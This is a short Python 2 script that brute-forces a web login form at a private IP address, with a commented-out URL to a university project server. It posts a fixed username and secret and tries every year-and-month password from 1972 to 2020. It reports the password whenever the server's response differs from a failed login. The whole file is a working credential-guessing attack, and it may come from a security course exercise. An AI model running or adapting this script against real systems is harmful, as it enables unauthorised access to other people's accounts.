#!/usr/bin/python

import requests
import sys

login_url = "https://172.27.30.144/"
# BASEURL = "https://cseproj91.cse.iitk.ac.in:9876/index.php"

log = {'login':'vikasm', 'password':'1900', 'secret' : 'hello'}
r = requests.post(login_url, data= log)
a = r.content
print a

for i in range(1972,2021):
    for j in range(1,13): 
        if(j/10==0):
            j = '0'+str(j)
        password = str(i)+str(j)    
        log = {'login':'vikasm', 'password':password, 'secret' : 'hello'}
        r = requests.post(login_url, data= log)
        if(a!=r.content):
            print r.content
            print password
